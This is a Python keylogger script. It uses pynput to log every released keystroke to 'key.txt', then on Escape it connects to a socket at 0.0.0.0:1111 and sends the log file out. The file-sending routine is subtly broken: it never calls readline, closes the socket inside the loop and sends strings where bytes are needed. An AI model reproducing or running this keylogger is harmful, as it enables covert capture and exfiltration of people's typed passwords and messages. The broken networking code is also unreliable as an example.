from pynput import keyboard 
import os
import socket

FILENAME = "key.txt"
def connect():
    host = "0.0.0.0"
    port = 1111
    filesize = os.path.getsize(FILENAME)

    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host,port))
    print("[+] Connected.")

    # send the filename and filesize
    s.send(f"{FILENAME} {filesize}".encode())
    with open(FILENAME,"r") as f:
        while True:
            # read the bytes from the file
            content = f.readline
            if not content:
            # file transmitting is done
                break
        # we use sendall to assure transimission in 
        # busy networks
            s.sendall(content)
        # close the socket
        s.close()
    f.close()

def on_press(key):
    if key == keyboard.Key.esc:
        listener.stop()     
        connect()       
        pass

    
def on_release(key):
    try:
        with open("key.txt",'a+') as f:
            if key == keyboard.Key.backspace:
                f.write("(Backspace)")
            elif key == keyboard.Key.enter:
                f.write("(Enter)")
            elif key == keyboard.Key.space:
                f.write("(Space)")
            elif key == keyboard.Key.left:
                f.write("(Left Arrow)")
            elif key == keyboard.Key.right:
                f.write("(Right Arrow)")
            elif key == keyboard.Key.up:
                f.write("(Up Arrow)")
            elif key == keyboard.Key.down:
                f.write("(Down Arrow)")
            else:
                f.write(key.char)
            f.flush()
            f.close()
    except AttributeError:
        pass

with open("key.txt",'a+') as f:
    f.write("\n")
    f.close()
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
